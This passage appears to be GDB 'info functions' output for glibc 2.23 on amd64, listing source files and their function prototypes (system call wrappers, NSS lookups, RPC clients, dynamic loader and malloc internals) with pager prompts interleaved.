__pid_t __GI___waitpid(__pid_t, int *, int);

File ../sysdeps/unix/sysv/linux/wordsize-64/../fstatvfs.c:
int __fstatvfs(int, struct statvfs *);

File ../sysdeps/unix/sysv/linux/wordsize-64/../getdirentries.c:
ssize_t getdirentries(int, char *, size_t, off_t *);

File ../sysdeps/unix/sysv/linux/wordsize-64/../openat.c:
---Type <return> to continue, or q <return> to quit---
int __GI___openat(int, const char *, int, ...);

File ../sysdeps/unix/sysv/linux/wordsize-64/../statvfs.c:
int __statvfs(const char *, struct statvfs *);

File ../sysdeps/unix/sysv/linux/wordsize-64/fallocate.c:
int fallocate(int, int, __off_t, __off_t);

File ../sysdeps/unix/sysv/linux/wordsize-64/fxstat.c:
int __GI___fxstat(int, int, struct stat *);

File ../sysdeps/unix/sysv/linux/wordsize-64/fxstatat.c:
int __GI___fxstatat(int, int, const char *, struct stat *, int);
int __fxstatat(int, int, const char *, struct stat *, int);

File ../sysdeps/unix/sysv/linux/wordsize-64/lxstat.c:
int __GI___lxstat(int, const char *, struct stat *);

File ../sysdeps/unix/sysv/linux/wordsize-64/mmap.c:
void *__mmap(void *, size_t, int, int, int, off_t);

File ../sysdeps/unix/sysv/linux/wordsize-64/posix_fadvise.c:
int posix_fadvise(int, off_t, off_t, int);

File ../sysdeps/unix/sysv/linux/wordsize-64/posix_fallocate.c:
int posix_fallocate(int, __off_t, __off_t);

File ../sysdeps/unix/sysv/linux/wordsize-64/preadv.c:
ssize_t preadv(int, const struct iovec *, int, off_t);

File ../sysdeps/unix/sysv/linux/wordsize-64/pwritev.c:
ssize_t pwritev(int, const struct iovec *, int, off_t);

File ../sysdeps/unix/sysv/linux/wordsize-64/xstat.c:
int __GI___xstat(int, const char *, struct stat *);

File ../sysdeps/unix/sysv/linux/x86/gettimeofday.c:
void *__gettimeofday(void);
static int __gettimeofday_syscall(struct timeval *, struct timezone *);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/unix/sysv/linux/x86/sysconf.c:
long __GI___sysconf(int);

File ../sysdeps/unix/sysv/linux/x86/time.c:
void *time(void);
static time_t __time_syscall(time_t *);

File ../sysdeps/unix/sysv/linux/x86_64/../i386/get_clockfreq.c:
hp_timing_t __get_clockfreq(void);

File ../sysdeps/unix/sysv/linux/x86_64/../sched_setaffinity.c:
int __sched_setaffinity_new(pid_t, size_t, const cpu_set_t *);
int __sched_setaffinity_old(pid_t, const cpu_set_t *);

File ../sysdeps/unix/sysv/linux/x86_64/brk.c:
int __brk(void *);

File ../sysdeps/unix/sysv/linux/x86_64/makecontext.c:
void __makecontext(ucontext_t *, void (*)(void), int, ...);

File ../sysdeps/unix/sysv/linux/x86_64/profil-counter.h:
static void __profil_counter(int, siginfo_t *, struct ucontext *);
static void __profil_counter_uint(int, siginfo_t *, struct ucontext *);
static void __profil_counter_ushort(int, siginfo_t *, struct ucontext *);

File ../sysdeps/unix/sysv/linux/x86_64/recv.c:
ssize_t __libc_recv(int, void *, size_t, int);

File ../sysdeps/unix/sysv/linux/x86_64/send.c:
ssize_t __libc_send(int, const void *, size_t, int);

File ../sysdeps/unix/sysv/linux/x86_64/sigaction.c:
int __GI___libc_sigaction(int, const struct sigaction *, struct sigaction *);
int __libc_sigaction(int, const struct sigaction *, struct sigaction *);

File ../sysdeps/unix/sysv/linux/x86_64/sigpending.c:
int sigpending(sigset_t *);

File ../sysdeps/unix/sysv/linux/x86_64/sigprocmask.c:
int __sigprocmask(int, const sigset_t *, sigset_t *);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/unix/sysv/linux/x86_64/umount.c:
long __umount(const char *);

File ../sysdeps/unix/sysv/linux/xmknod.c:
int __GI___xmknod(int, const char *, mode_t, dev_t *);

File ../sysdeps/unix/sysv/linux/xmknodat.c:
int __GI___xmknodat(int, int, const char *, mode_t, dev_t *);

File ../sysdeps/wordsize-64/../../io/fts.c:
FTSENT *fts_children(FTS *, int);
int fts_close(FTS *);
FTS *fts_open(char * const *, int, int (*)(const FTSENT **, const FTSENT **));
FTSENT *fts_read(FTS *);
int fts_set(FTS *, FTSENT *, int);
static FTSENT *fts_build(FTS *, int);
static u_short fts_stat(FTSENT *, int, FTS *);

File ../sysdeps/wordsize-64/../../io/ftw.c:
int __new_nftw(const char *, __nftw_func_t, int, int);
int __old_nftw(const char *, __nftw_func_t, int, int);
int ftw(const char *, __ftw_func_t, int);
static int ftw_dir(struct ftw_data *, struct stat *, struct dir_data *);
static int ftw_startup(const char *, int, void *, int, int);
static int object_compare(const void *, const void *);
static int process_entry(struct ftw_data *, struct dir_data *, const char *, size_t, int);

File ../sysdeps/wordsize-64/strtoimax.c:
intmax_t strtoimax(const char * restrict, char ** restrict, int);

File ../sysdeps/wordsize-64/strtoumax.c:
uintmax_t strtoumax(const char * restrict, char ** restrict, int);

File ../sysdeps/wordsize-64/wcstoimax.c:
intmax_t wcstoimax(const wchar_t * restrict, wchar_t ** restrict, int);

File ../sysdeps/wordsize-64/wcstoumax.c:
uintmax_t wcstoumax(const wchar_t * restrict, wchar_t ** restrict, int);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/x86/dl-get-cpu-features.c:
const struct cpu_features *__get_cpu_features(void);

File ../sysdeps/x86_64/../i386/ldbl2mpn.c:
mp_size_t __mpn_extract_long_double(mp_ptr, mp_size_t, int *, int *, long double);

File ../sysdeps/x86_64/backtrace.c:
int __GI___backtrace(void **, int);
static _Unwind_Reason_Code backtrace_helper(struct _Unwind_Context *, void *);
static _Unwind_Word dummy_getcfa(struct _Unwind_Context *);
static void free_mem(void);
static void init(void);

File ../sysdeps/x86_64/cacheinfo.c:
long __cache_sysconf(int);
static long handle_amd(int);
static long handle_intel(int, unsigned int);
static void init_cacheinfo(void);
static long intel_check_word(int, unsigned int, _Bool *, _Bool *);

File ../sysdeps/x86_64/ffs.c:
int __GI___ffs(int);

File ../sysdeps/x86_64/ffsll.c:
int ffsll(long long);

File ../sysdeps/x86_64/multiarch/ifunc-impl-list.c:
size_t __libc_ifunc_impl_list(const char *, struct libc_ifunc_impl *, size_t);

File ../sysdeps/x86_64/multiarch/memmove.c:
void *__libc_memmove(void);

File ../sysdeps/x86_64/multiarch/memmove_chk.c:
void *__memmove_chk(void);

File ../sysdeps/x86_64/multiarch/sched_cpucount.c:
void *__sched_cpucount(void);

File ../sysdeps/x86_64/multiarch/strcspn-c.c:
size_t __strcspn_sse42(const char *, const char *);
---Type <return> to continue, or q <return> to quit---
char *__strpbrk_sse42(const char *, const char *);

File ../sysdeps/x86_64/multiarch/strspn-c.c:
size_t __strspn_sse42(const char *, const char *);

File ../sysdeps/x86_64/multiarch/strstr.c:
void *__libc_strstr(void);

File ../sysdeps/x86_64/tlsdesc.c:
void _dl_tlsdesc_resolve_hold_fixup(volatile struct tlsdesc *, void *);
void _dl_tlsdesc_resolve_rela_fixup(volatile struct tlsdesc *, struct link_map *);
void _dl_unmap(struct link_map *);

File ../wcsmbs/wcscpy.c:
wchar_t *__wcscpy_sse2(wchar_t *, const wchar_t *);

File ../wcsmbs/wmemcmp.c:
int __wmemcmp_sse2(const wchar_t *, const wchar_t *, size_t);

File ./stpncpy.c:
char *__stpncpy_sse2(char *, const char *, size_t);

File ./strncpy.c:
char *__strncpy_sse2(char *, const char *, size_t);

File ./strtod_nan_main.c:
double __GI___strtod_nan(const char *, char **, char);
float __GI___strtof_nan(const char *, char **, char);
long double __GI___strtold_nan(const char *, char **, char);

File ./tlsdeschtab.h:
void *_dl_make_tlsdesc_dynamic(struct link_map *, size_t);

File ./wcscasecmp.c:
int __GI___wcscasecmp_l(const wchar_t *, const wchar_t *, __locale_t);

File ./wcsncase.c:
int __GI___wcsncasecmp_l(const wchar_t *, const wchar_t *, size_t, __locale_t);

File /build/glibc-Cl5G7W/glibc-2.23/build-tree/amd64-libc/misc/stub-syscalls.c:
---Type <return> to continue, or q <return> to quit---
long _no_syscall(void);

File XXX-lookup.c:
int __GI___nss_aliases_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_ethers_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_group_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_gshadow_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_hosts_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_netgroup_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_networks_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_passwd_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_protocols_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_publickey_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_rpc_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_services_lookup2(service_user **, const char *, const char *, void **);
int __GI___nss_shadow_lookup2(service_user **, const char *, const char *, void **);
int __nss_aliases_lookup(service_user **, const char *, void **);
int __nss_ethers_lookup(service_user **, const char *, void **);
int __nss_group_lookup(service_user **, const char *, void **);
int __nss_gshadow_lookup(service_user **, const char *, void **);
int __nss_hosts_lookup(service_user **, const char *, void **);
int __nss_netgroup_lookup(service_user **, const char *, void **);
int __nss_networks_lookup(service_user **, const char *, void **);
int __nss_passwd_lookup(service_user **, const char *, void **);
int __nss_protocols_lookup(service_user **, const char *, void **);
int __nss_publickey_lookup(service_user **, const char *, void **);
int __nss_rpc_lookup(service_user **, const char *, void **);
int __nss_shadow_lookup(service_user **, const char *, void **);

File __assert.c:
void __assert(const char *, const char *, int);

File __fbufsize.c:
size_t __fbufsize(FILE *);

File __flbf.c:
int __flbf(FILE *);

File __fpending.c:
size_t __fpending(FILE *);
---Type <return> to continue, or q <return> to quit---

File __fpurge.c:
void __fpurge(FILE *);

File __freadable.c:
int __freadable(FILE *);

File __freading.c:
int __freading(FILE *);

File __fsetlocking.c:
int __GI___fsetlocking(FILE *, int);

File __fwritable.c:
int __fwritable(FILE *);

File __fwriting.c:
int __fwriting(FILE *);

File _i18n_number.h:
static char *_i18n_number_rewrite(char *, char *, char *);

File _itoa.c:
char *_fitoa_word(unsigned long, char *, unsigned int, int);
char *_itoa_word(unsigned long, char *, unsigned int, int);

File _strerror.c:
char *__GI___strerror_r(int, char *, size_t);

File a64l.c:
long a64l(const char *);

File abort.c:
void __GI_abort(void);

File abs.c:
int abs(int);

File alloca_cutoff.c:
int __GI___libc_alloca_cutoff(size_t);
---Type <return> to continue, or q <return> to quit---

File alphasort.c:
int alphasort(const struct dirent **, const struct dirent **);

File alt_digit.c:
const char *_nl_get_alt_digit(unsigned int, struct __locale_data *);
const wchar_t *_nl_get_walt_digit(unsigned int, struct __locale_data *);
int _nl_parse_alt_digit(const char **, struct __locale_data *);

File arena.c:
void __malloc_fork_lock_parent(void);
void __malloc_fork_unlock_child(void);
void __malloc_fork_unlock_parent(void);
static void *__failing_morecore(ptrdiff_t);
static mstate arena_get2(size_t, mstate);
static mstate arena_get_retry(mstate, size_t);
static void arena_thread_freeres(void);
static void detach_arena(mstate);
static mstate get_free_list(void);
static heap_info *new_heap(size_t, size_t);
static void ptmalloc_init(void);

File argp-fmtstream.c:
int __argp_fmtstream_ensure(struct argp_fmtstream *, size_t);
void __argp_fmtstream_free(argp_fmtstream_t);
ssize_t __argp_fmtstream_printf(struct argp_fmtstream *, const char *, ...);
void __argp_fmtstream_update(argp_fmtstream_t);
argp_fmtstream_t __argp_make_fmtstream(FILE *, size_t, size_t, ssize_t);

File argp-fmtstream.h:
size_t __argp_fmtstream_point(argp_fmtstream_t);
int __argp_fmtstream_putc(argp_fmtstream_t, int);
int __argp_fmtstream_puts(argp_fmtstream_t, const char *);
size_t __argp_fmtstream_set_lmargin(argp_fmtstream_t, size_t);
size_t __argp_fmtstream_set_rmargin(argp_fmtstream_t, size_t);
size_t __argp_fmtstream_set_wmargin(argp_fmtstream_t, size_t);
size_t __argp_fmtstream_write(argp_fmtstream_t, const char *, size_t);

File argp-help.c:
void __argp_error(const struct argp_state *, const char *, ...);
---Type <return> to continue, or q <return> to quit---
void __argp_failure(const struct argp_state *, int, int, const char *, ...);
void __argp_help(const struct argp *, FILE *, unsigned int, char *);
void __argp_state_help(const struct argp_state *, FILE *, unsigned int);
static void _help(const struct argp *, const struct argp_state *, FILE *, unsigned int, char *);
static size_t argp_args_levels(const struct argp *, const struct argp *);
static int argp_args_usage(const struct argp *, const struct argp_state *, char **, int, argp_fmtstream_t);
static int argp_doc(const struct argp *, const struct argp_state *, int, int, int, argp_fmtstream_t);

static struct hol *argp_hol(const struct argp *, struct hol_cluster *);
static void comma(unsigned int, struct pentry_state *);
static int hol_entry_qcmp(const void *, const void *);
static void hol_usage(struct hol *, argp_fmtstream_t);
static void print_header(const char *, const struct argp *, struct pentry_state *);

File argp-parse.c:
void *__argp_input(const struct argp *, const struct argp_state *);
error_t __argp_parse(const struct argp *, int, char **, unsigned int, int *, void *);
static error_t argp_default_parser(int, char *, struct argp_state *);
static error_t argp_version_parser(int, char *, struct argp_state *);
static void calc_sizes(const struct argp *, struct parser_sizes *);
static struct group *convert_options(const struct argp *, struct group *, unsigned int, struct group *, struct parser_convert_state *);

File argp.h:
void __argp_usage(const struct argp_state *);
int __option_is_end(const struct argp_option *);
int __option_is_short(const struct argp_option *);

File argz-addsep.c:
error_t __argz_add_sep(char **, size_t *, const char *, int);

File argz-append.c:
error_t __argz_add(char **, size_t *, const char *);
error_t __argz_append(char **, size_t *, const char *, size_t);

File argz-count.c:
size_t __GI___argz_count(const char *, size_t);

File argz-create.c:
error_t __argz_create(char * const *, char **, size_t *);

File argz-ctsep.c:
---Type <return> to continue, or q <return> to quit---
error_t __argz_create_sep(const char *, int, char **, size_t *);

File argz-delete.c:
void __GI_argz_delete(char **, size_t *, char *);

File argz-extract.c:
void __argz_extract(const char *, size_t, char **);

File argz-insert.c:
error_t __argz_insert(char **, size_t *, char *, const char *);

File argz-next.c:
char *__argz_next(const char *, size_t, const char *);

File argz-replace.c:
error_t __argz_replace(char **, size_t *, const char *, const char *, unsigned int *);

File argz-stringify.c:
void __GI___argz_stringify(char *, size_t, int);

File asctime.c:
char *__GI_asctime(const struct tm *);
char *__asctime_r(const struct tm *, char *);

File asprintf.c:
int ___asprintf(char **, const char *, ...);

File asprintf_chk.c:
int __asprintf_chk(char **, int, const char *, ...);

File assert-perr.c:
void __GI___assert_perror_fail(int, const char *, unsigned int, const char *);

File assert.c:
void __GI___assert_fail(const char *, const char *, unsigned int, const char *);
void __assert_fail_base(const char *, const char *, const char *, unsigned int, const char *);

File atof.c:
double atof(const char *);

---Type <return> to continue, or q <return> to quit---
File atoi.c:
int atoi(const char *);

File atol.c:
long atol(const char *);

File atoll.c:
long long atoll(const char *);

File auth_des.c:
AUTH *__GI_authdes_create(const char *, u_int, struct sockaddr *, des_block *);
AUTH *__GI_authdes_pk_create(const char *, netobj *, u_int, struct sockaddr *, des_block *);
static void authdes_destroy(AUTH *);
static bool_t authdes_marshal(AUTH *, XDR *);
static void authdes_nextverf(AUTH *);
static bool_t authdes_refresh(AUTH *);
static bool_t authdes_validate(AUTH *, struct opaque_auth *);

File auth_none.c:
AUTH *__GI_authnone_create(void);
static void authnone_create_once(void);
static void authnone_destroy(AUTH *);
static bool_t authnone_marshal(AUTH *, XDR *);
static bool_t authnone_refresh(AUTH *);
static bool_t authnone_validate(AUTH *, struct opaque_auth *);

File auth_unix.c:
AUTH *__GI_authunix_create(char *, uid_t, gid_t, int, gid_t *);
AUTH *__GI_authunix_create_default(void);
static void authunix_destroy(AUTH *);
static bool_t authunix_marshal(AUTH *, XDR *);
static void authunix_nextverf(AUTH *);
static bool_t authunix_refresh(AUTH *);
static bool_t authunix_validate(AUTH *, struct opaque_auth *);

File authdes_prot.c:
bool_t __GI_xdr_authdes_cred(XDR *, struct authdes_cred *);
bool_t __GI_xdr_authdes_verf(XDR *, struct authdes_verf *);

File authuxprot.c:
---Type <return> to continue, or q <return> to quit---
bool_t __GI_xdr_authunix_parms(XDR *, struct authunix_parms *);

File backtracesyms.c:
char **__backtrace_symbols(void * const *, int);

File backtracesymsfd.c:
void __GI___backtrace_symbols_fd(void * const *, int, int);

File basename.c:
char *__GI___basename(const char *);

File bindrsvprt.c:
int __GI_bindresvport(int, struct sockaddr_in *);

File bindtextdom.c:
char *__bind_textdomain_codeset(const char *, const char *);
char *__bindtextdomain(const char *, const char *);

File bsd-getpgrp.c:
pid_t __bsd_getpgrp(pid_t);

File btowc.c:
wint_t __btowc(int);

File c16rtomb.c:
size_t c16rtomb(char *, char16_t, mbstate_t *);

File canonicalize.c:
char *__canonicalize_file_name(const char *);
char *__old_realpath(const char *, char *);
char *__realpath(const char *, char *);

File catgets.c:
int catclose(nl_catd);
char *catgets(nl_catd, int, int, const char *);
nl_catd catopen(const char *, int);

File cfmakeraw.c:
void cfmakeraw(struct termios *);

---Type <return> to continue, or q <return> to quit---
File cfsetspeed.c:
int cfsetspeed(struct termios *, speed_t);

File check_fds.c:
void __libc_check_standard_fds(void);

File chflags.c:
int chflags(const char *, unsigned long);

File chk_fail.c:
void __GI___chk_fail(void);

File clearerr.c:
void clearerr(FILE *);

File clearerr_u.c:
void clearerr_unlocked(FILE *);

File clnt_gen.c:
CLIENT *__GI_clnt_create(const char *, u_long, u_long, const char *);

File clnt_perr.c:
void __GI_clnt_pcreateerror(const char *);

void __GI_clnt_perrno(enum clnt_stat);
void __GI_clnt_perror(CLIENT *, const char *);
char *__GI_clnt_spcreateerror(const char *);
char *__GI_clnt_sperrno(enum clnt_stat);
char *__GI_clnt_sperror(CLIENT *, const char *);
static void free_mem(void);

File clnt_raw.c:
CLIENT *__GI_clntraw_create(u_long, u_long);
static void clntraw_abort(void);
static enum clnt_stat clntraw_call(CLIENT *, u_long, xdrproc_t, caddr_t, xdrproc_t, caddr_t, struct timeval);
static bool_t clntraw_control(CLIENT *, int, char *);
static void clntraw_destroy(CLIENT *);
static bool_t clntraw_freeres(CLIENT *, xdrproc_t, caddr_t);
static void clntraw_geterr(CLIENT *, struct rpc_err *);

File clnt_simp.c:
---Type <return> to continue, or q <return> to quit---
int __GI_callrpc(const char *, u_long, u_long, u_long, xdrproc_t, const char *, xdrproc_t, char *);
void __rpc_thread_clnt_cleanup(void);

File clnt_tcp.c:
CLIENT *__GI_clnttcp_create(struct sockaddr_in *, u_long, u_long, int *, u_int, u_int);
static void clnttcp_abort(void);
static enum clnt_stat clnttcp_call(CLIENT *, u_long, xdrproc_t, caddr_t, xdrproc_t, caddr_t, struct timeval);
static bool_t clnttcp_control(CLIENT *, int, char *);
static void clnttcp_destroy(CLIENT *);
static bool_t clnttcp_freeres(CLIENT *, xdrproc_t, caddr_t);
static void clnttcp_geterr(CLIENT *, struct rpc_err *);
static int readtcp(char *, char *, int);
static int writetcp(char *, char *, int);

File clnt_udp.c:
CLIENT *__GI___libc_clntudp_bufcreate(struct sockaddr_in *, u_long, u_long, struct timeval, int *, u_int, u_int, int);
CLIENT *__GI_clntudp_bufcreate(struct sockaddr_in *, u_long, u_long, struct timeval, int *, u_int, u_int);
CLIENT *__GI_clntudp_create(struct sockaddr_in *, u_long, u_long, struct timeval, int *);
static void clntudp_abort(void);
static enum clnt_stat clntudp_call(CLIENT *, u_long, xdrproc_t, caddr_t, xdrproc_t, caddr_t, struct timeval);
static bool_t clntudp_control(CLIENT *, int, char *);
static void clntudp_destroy(CLIENT *);
static bool_t clntudp_freeres(CLIENT *, xdrproc_t, caddr_t);
static void clntudp_geterr(CLIENT *, struct rpc_err *);

File clnt_unix.c:
CLIENT *__GI_clntunix_create(struct sockaddr_un *, u_long, u_long, int *, u_int, u_int);
static int __msgwrite(int, void *, size_t);
static void clntunix_abort(void);
static enum clnt_stat clntunix_call(CLIENT *, u_long, xdrproc_t, caddr_t, xdrproc_t, caddr_t, struct timeval);
static bool_t clntunix_control(CLIENT *, int, char *);
static void clntunix_destroy(CLIENT *);
static bool_t clntunix_freeres(CLIENT *, xdrproc_t, caddr_t);
static void clntunix_geterr(CLIENT *, struct rpc_err *);
static int readunix(char *, char *, int);
static int writeunix(char *, char *, int);

File cmp.c:
int __mpn_cmp(mp_srcptr, mp_srcptr, mp_size_t);

---Type <return> to continue, or q <return> to quit---
File coll-lookup.c:
int32_t __collidx_table_lookup(const char *, uint32_t);
uint32_t __collseq_table_lookup(const char *, uint32_t);

File compat-initgroups.c:
static enum nss_status compat_call(service_user *, const char *, gid_t, long *, long *, gid_t **, long, int *);

File confstr.c:
size_t __GI_confstr(int, char *, size_t);

File confstr_chk.c:
size_t __confstr_chk(int, char *, size_t, size_t);

File create_xid.c:
unsigned long _create_xid(void);

File ctime.c:
char *ctime(const time_t *);

File ctime_r.c:
char *ctime_r(const time_t *, char *);

File ctype-c99.c:
int isblank(int);

File ctype-c99_l.c:
int __isblank_l(int, __locale_t);

File ctype-extn.c:
int _tolower(int);
int _toupper(int);
int isascii(int);
int toascii(int);

File ctype-info.c:
void __GI___ctype_init(void);

File ctype.c:
int isalnum(int);
int isalpha(int);
---Type <return> to continue, or q <return> to quit---
int iscntrl(int);
int isdigit(int);
int isgraph(int);
int islower(int);
int isprint(int);
int ispunct(int);
int isspace(int);
int isupper(int);
int isxdigit(int);
int tolower(int);
int toupper(int);

File ctype_l.c:
int __isalnum_l(int, __locale_t);
int __isalpha_l(int, __locale_t);
int __iscntrl_l(int, __locale_t);
int __isdigit_l(int, __locale_t);
int __isgraph_l(int, __locale_t);
int __islower_l(int, __locale_t);
int __isprint_l(int, __locale_t);
int __ispunct_l(int, __locale_t);
int __isspace_l(int, __locale_t);
int __isupper_l(int, __locale_t);
int __isxdigit_l(int, __locale_t);
int __tolower_l(int, __locale_t);
int __toupper_l(int, __locale_t);

File cxa_at_quick_exit.c:
int __cxa_at_quick_exit(void (*)(void *), void *);

File cxa_atexit.c:
int __GI___cxa_atexit(void (*)(void *), void *, void *);
int __internal_atexit(void (*)(void *), void *, void *, struct exit_function_list **);
struct exit_function *__new_exitfn(struct exit_function_list **);

File cxa_finalize.c:
void __cxa_finalize(void *);

File cxa_thread_atexit_impl.c:
void __GI___call_tls_dtors(void);
---Type <return> to continue, or q <return> to quit---
int __cxa_thread_atexit_impl(dtor_func, void *, void *);

File daemon.c:
int daemon(int, int);

File dcgettext.c:
char *__GI___dcgettext(const char *, const char *, int);

File dcigettext.c:
char *__dcigettext(const char *, const char *, const char *, int, unsigned long, int);
char *_nl_find_msg(struct loaded_l10nfile *, struct binding *, const char *, int, size_t *);
static void free_mem(void);
static int transcmp(const void *, const void *);

File dcngettext.c:
char *__dcngettext(const char *, const char *, const char *, unsigned long, int);

File des_crypt.c:
int __GI_cbc_crypt(char *, char *, unsigned int, unsigned int, char *);
int __GI_ecb_crypt(char *, char *, unsigned int, unsigned int);

File des_impl.c:
int _des_crypt(char *, unsigned int, struct desparams *);

File des_soft.c:
void __GI_des_setparity(char *);

File dgettext.c:
char *__dgettext(const char *, const char *);

File difftime.c:
double __difftime(time_t, time_t);

File digits_dots.c:
int __GI___nss_hostname_digits_dots(const char *, struct hostent *, char **, size_t *, size_t, struct hostent **, enum nss_status *, 
    int, int *);

File dirname.c:
char *dirname(char *);

---Type <return> to continue, or q <return> to quit---
File div.c:
div_t div(int, int);

File divmod_1.c:
mp_limb_t __mpn_divmod_1(mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);

File divrem.c:
mp_limb_t __mpn_divrem(mp_ptr, mp_size_t, mp_ptr, mp_size_t, mp_srcptr, mp_size_t);

File dl-addr.c:





int __GI__dl_addr(const void *, Dl_info *, struct link_map **, const Elf64_Sym **);
int _dl_addr_inside_object(struct link_map *, const Elf64_Addr);

File dl-altinit.c:
static void dlinit_alt(void);

File dl-cache.c:
int _dl_cache_libcmp(const char *, const char *);
char *_dl_load_cache_lookup(const char *);
void _dl_unload_cache(void);

File dl-caller.c:
int _dl_check_caller(const void *, enum allowmask);

File dl-close.c:
void _dl_close(void *);
void _dl_close_worker(struct link_map *, _Bool);
static _Bool remove_slotinfo(size_t, struct dtv_slotinfo_list *, size_t, _Bool);

File dl-conflict.c:
void _dl_resolve_conflicts(struct link_map *, Elf64_Rela *, Elf64_Rela *);

File dl-debug.c:
void __GI__dl_debug_state(void);

struct r_debug *_dl_debug_initialize(Elf64_Addr, Lmid_t);

File dl-deps.c:
void _dl_map_object_deps(struct link_map *, struct link_map **, unsigned int, int, int);
static ptrdiff_t _dl_build_local_scope(struct link_map **, struct link_map *);
static void openaux(void *);
---Type <return> to continue, or q <return> to quit---

File dl-environ.c:
char *_dl_next_ld_env_entry(char ***);
int unsetenv(const char *);

File dl-error.c:
int _dl_catch_error(const char **, const char **, _Bool *, void (*)(void *), void *);
void _dl_receive_error(receiver_fct, void (*)(void *), void *);
void _dl_signal_cerror(int, const char *, const char *, const char *);
void _dl_signal_error(int, const char *, const char *, const char *);

File dl-fini.c:
void _dl_fini(void);
void _dl_sort_fini(struct link_map **, size_t, char *, Lmid_t);

File dl-hwcaps.c:
const struct r_strlenpair *_dl_important_hwcaps(const char *, size_t, size_t *, size_t *);

File dl-init.c:
void _dl_init(struct link_map *, int, char **, char **);
static void call_init(struct link_map *, int, char **, char **);

File dl-iteratephdr.c:
int __GI___dl_iterate_phdr(int (*)(struct dl_phdr_info *, size_t, void *), void *);

File dl-libc.c:
int __GI___libc_dlclose(void *);
void *__GI___libc_dlopen_mode(const char *, int);
void *__GI___libc_dlsym(void *, const char *);
static void do_dlclose(void *);
static void do_dlopen(void *);
static void do_dlsym(void *);
static void free_mem(void);
static _Bool free_slotinfo(struct dtv_slotinfo_list **);

File dl-load.c:
size_t _dl_dst_count(const char *, int);
char *_dl_dst_substitute(struct link_map *, const char *, char *, int);
void _dl_init_paths(const char *);
struct link_map *_dl_map_object(struct link_map *, const char *, int, int, int, Lmid_t);

---Type <return> to continue, or q <return> to quit---
void _dl_rtld_di_serinfo(struct link_map *, Dl_serinfo *, _Bool);
static struct link_map *_dl_map_object_from_fd(const char *, const char *, int, struct filebuf *, char *, struct link_map *, int, int, 
    void **, Lmid_t);
static _Bool decompose_rpath(struct r_search_path_struct *, const char *, struct link_map *, const char *);
static struct r_search_path_elem **fillin_rpath(char *, struct r_search_path_elem **, const char *, int, const char *, const char *, 
    struct link_map *);
static size_t is_dst(const char *, const char *, const char *, int, int);
static _Bool is_trusted_path_normalize(const char *, size_t);
static void lose(int, int, const char *, char *, struct link_map *, const char *, struct r_debug *, Lmid_t);
static int open_path(const char *, size_t, int, struct r_search_path_struct *, char **, struct filebuf *, struct link_map *, int, 
    _Bool *);
static int open_verify(const char *, struct filebuf *, struct link_map *, int, int, _Bool *, _Bool, int);

File dl-lookup.c:
lookup_t _dl_lookup_symbol_x(const char *, struct link_map *, const Elf64_Sym **, struct r_scope_elem **, 
    const struct r_found_version *, int, int, struct link_map *);
void _dl_setup_hash(struct link_map *);
static const Elf64_Sym *check_match(const char * const, const Elf64_Sym * const, const struct r_found_version * const, const int, 
    const int, const Elf64_Sym * const, const Elf_Symndx, const char * const, const struct link_map * const, const Elf64_Sym ** const, 
    int * const);
static int do_lookup_x(const char *, uint_fast32_t, unsigned long *, const Elf64_Sym *, struct sym_val *, struct r_scope_elem *, 
    size_t, const struct r_found_version * const, int, struct link_map *, int, struct link_map *);

File dl-minimal.c:
void __GI___assert_fail(const char *, const char *, unsigned int, const char *);
void __GI___assert_perror_fail(int, const char *, unsigned int, const char *);
void __GI___chk_fail(void);
void __GI___libc_fatal(const char *);
void *__libc_memalign(size_t, size_t);
int __sigjmp_save(struct __jmp_buf_tag *, int);
char *__strerror_r(int, char *, size_t);
char *__strsep(char **, const char *);
unsigned long __strtoul_internal(const char *, char **, int, int);
char *_itoa(unsigned long long, char *, unsigned int, int);
void *calloc(size_t, size_t);
void free(void *);
void *malloc(size_t);
void *realloc(void *, size_t);

File dl-misc.c:
---Type <return> to continue, or q <return> to quit---
void _dl_debug_printf(const char *, ...);
void _dl_debug_printf_c(const char *, ...);
void _dl_dprintf(int, const char *, ...);
unsigned long _dl_higher_prime_number(unsigned long);
int _dl_name_match_p(const char *, const struct link_map *);
void *_dl_sysdep_read_whole_file(const char *, size_t *, int);
static void _dl_debug_vdprintf(int, int, const char *, struct __va_list_tag *);

File dl-object.c:
void _dl_add_to_namespace_list(struct link_map *, Lmid_t);
struct link_map *_dl_new_object(char *, const char *, int, struct link_map *, int, Lmid_t);

File dl-open.c:
struct link_map *__GI__dl_find_dso_for_object(const Elf64_Addr);
int _dl_addr_inside_object(struct link_map *, const Elf64_Addr);
void *_dl_open(const char *, int, const void *, Lmid_t, int, char **, char **);
void _dl_show_scope(struct link_map *, int);
static int add_to_global(struct link_map *);
static void dl_open_worker(void *);

File dl-profile.c:
void __GI__dl_mcount(Elf64_Addr, Elf64_Addr);
void _dl_start_profile(void);

File dl-profstub.c:
void __GI__dl_mcount_wrapper_check(void *);
void _dl_mcount_wrapper(void *);

File dl-reloc.c:
void _dl_allocate_static_tls(struct link_map *);
void _dl_nothread_init_static_tls(struct link_map *);
void _dl_protect_relro(struct link_map *);
void _dl_reloc_bad_type(struct link_map *, unsigned int, int);
void _dl_relocate_object(struct r_scope_elem **, int, int);
int _dl_try_allocate_static_tls(struct link_map *);

File dl-scope.c:
int _dl_scope_free(void *);

File dl-sym.c:
---Type <return> to continue, or q <return> to quit---
void *_dl_sym(void *, const char *, void *);
void *_dl_vsym(void *, const char *, const char *, void *);
static void call_dl_lookup(void *);
static void *do_sym(void *, const char *, void *, struct r_found_version *, int);

File dl-tls.c:
void *__GI___tls_get_addr(tls_index *);
void *__GI__dl_allocate_tls(void *);
void *__GI__dl_allocate_tls_init(void *);
void __GI__dl_deallocate_tls(void *, _Bool);
int __GI__dl_tls_setup(void);
void _dl_add_to_slotinfo(struct link_map *);
